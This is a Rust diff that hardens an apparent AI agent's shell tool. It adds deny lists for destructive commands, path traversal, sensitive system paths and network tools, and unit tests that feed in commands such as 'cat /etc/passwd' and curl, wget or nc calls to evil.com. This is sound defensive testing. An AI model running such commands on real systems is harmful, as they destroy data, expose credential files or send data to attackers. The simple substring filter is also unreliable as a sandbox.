@@ -58,11 +58,36 @@ impl Tool for ShellTool {
             .as_str()
             .ok_or_else(|| anyhow::anyhow!("Missing 'command' parameter"))?;
 
-        // Security: block dangerous commands
-        let dangerous = ["rm -rf /", "mkfs", "dd if=", "> /dev/sd", ":(){:|:&};:"];
+        // Security: block dangerous system commands
+        let dangerous = ["rm -rf /", "mkfs", "dd if=", "> /dev/sd", ":(){:|:&};:", "chmod -R 777 /"];
         for pattern in &dangerous {
             if command.contains(pattern) {
                 anyhow::bail!("Command contains blocked pattern: {}", pattern);
+            }
+        }
+
+        // Security: block workspace escape attempts
+        // 1. Block ".." in any form to prevent directory traversal
+        if command.contains("..") {
+            anyhow::bail!("Command contains path traversal ('..') which is not allowed");
+        }
+
+        // 2. Block absolute paths to sensitive system/other-user directories
+        let sensitive_prefixes = [
+            "/etc/", "/proc/", "/sys/", "/dev/",
+            "/root/", "/boot/", "/var/log",
+        ];
+        for prefix in &sensitive_prefixes {
+            if command.contains(prefix) {
+                anyhow::bail!("Command contains blocked absolute path: {}", prefix);
+            }
+        }
+
+        // 3. Block network exfiltration tools
+        let network_dangerous = ["curl ", "wget ", "nc ", "ncat ", "ssh "];
+        for pattern in &network_dangerous {
+            if command.contains(pattern) {
+                anyhow::bail!("Command contains blocked network tool: {}", pattern.trim());
             }
         }
 
@@ -91,5 +116,128 @@ impl Tool for ShellTool {
                 stderr
             ))
         }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use crate::base::ToolContext;
+
+    fn make_ctx(dir: &std::path::Path) -> ToolContext {
+        ToolContext {
+            user_id: "test-user".to_string(),
+            workspace_root: dir.to_string_lossy().to_string(),
+        }
+    }
+
+    #[tokio::test]
+    async fn test_shell_echo() {
+        let dir = tempfile::tempdir().unwrap();
+        let ctx = make_ctx(dir.path());
+        let tool = ShellTool::new(5);
+
+        let result = tool.execute(r#"{"command":"echo hello_world"}"#, &ctx).await.unwrap();
+        assert!(result.contains("hello_world"));
+    }
+
+    #[tokio::test]
+    async fn test_shell_create_and_run_python() {
+        let dir = tempfile::tempdir().unwrap();
+        let ctx = make_ctx(dir.path());
+        let tool = ShellTool::new(10);
+
+        // Create a Python file and run it
+        let create_cmd = r#"{"command":"echo \"print('py_ok')\" > test.py"}"#;
+        tool.execute(create_cmd, &ctx).await.unwrap();
+
+        let run_cmd = r#"{"command":"python3 test.py"}"#;
+        let result = tool.execute(run_cmd, &ctx).await.unwrap();
+        assert!(result.contains("py_ok"));
+    }
+
+    #[tokio::test]
+    async fn test_shell_blocked_command() {
+        let dir = tempfile::tempdir().unwrap();
+        let ctx = make_ctx(dir.path());
+        let tool = ShellTool::new(5);
+
+        let result = tool.execute(r#"{"command":"rm -rf /"}"#, &ctx).await;
+        assert!(result.is_err());
+    }
+
+    #[tokio::test]
+    async fn test_shell_isolation_blocks_traversal() {
+        let dir = tempfile::tempdir().unwrap();
+        let ctx = make_ctx(dir.path());
+        let tool = ShellTool::new(5);
+
+        // All path traversal attempts via ".." should be blocked
+        let traversal_attempts = [
+            r#"{"command":"cat ../other_user/secret.txt"}"#,
+            r#"{"command":"ls -la ../../"}"#,
+            r#"{"command":"cd .. && ls"}"#,
+            r#"{"command":"cp ../../../etc/passwd ."}"#,
+        ];
+        for cmd in &traversal_attempts {
+            let result = tool.execute(cmd, &ctx).await;
+            assert!(result.is_err(), "Should block traversal: {}", cmd);
+        }
+    }
+
+    #[tokio::test]
+    async fn test_shell_isolation_blocks_absolute_paths() {
+        let dir = tempfile::tempdir().unwrap();
+        let ctx = make_ctx(dir.path());
+        let tool = ShellTool::new(5);
+
+        // Absolute paths to sensitive directories should be blocked
+        let absolute_attempts = [
+            r#"{"command":"cat /etc/passwd"}"#,
+            r#"{"command":"ls /proc/self"}"#,
+            r#"{"command":"cat /var/log/syslog"}"#,
+            r#"{"command":"ls /root/"}"#,
+        ];
+        for cmd in &absolute_attempts {
+            let result = tool.execute(cmd, &ctx).await;
+            assert!(result.is_err(), "Should block absolute path: {}", cmd);
+        }
+    }
+
+    #[tokio::test]
+    async fn test_shell_isolation_blocks_network_tools() {
+        let dir = tempfile::tempdir().unwrap();
+        let ctx = make_ctx(dir.path());
+        let tool = ShellTool::new(5);
+
+        // Network tools that could exfiltrate data should be blocked
+        let network_attempts = [
+            r#"{"command":"curl http://evil.com/steal"}"#,
+            r#"{"command":"wget http://evil.com/malware"}"#,
+            r#"{"command":"nc evil.com 4444"}"#,
+        ];
+        for cmd in &network_attempts {
+            let result = tool.execute(cmd, &ctx).await;
+            assert!(result.is_err(), "Should block network tool: {}", cmd);
+        }
+    }
+
+    #[tokio::test]
+    async fn test_shell_allows_normal_workspace_operations() {
+        let dir = tempfile::tempdir().unwrap();
+        let ctx = make_ctx(dir.path());
+        let tool = ShellTool::new(5);
+
+        // Normal workspace operations should work fine
+        let result = tool.execute(r#"{"command":"echo hello > test.txt && cat test.txt"}"#, &ctx).await;
+        assert!(result.is_ok());
+        assert!(result.unwrap().contains("hello"));
+
+        // ls, mkdir, pwd should work
+        let result = tool.execute(r#"{"command":"mkdir -p src && echo done"}"#, &ctx).await;
+        assert!(result.is_ok());
+
+        let result = tool.execute(r#"{"command":"pwd"}"#, &ctx).await;
+        assert!(result.is_ok());
     }
 }
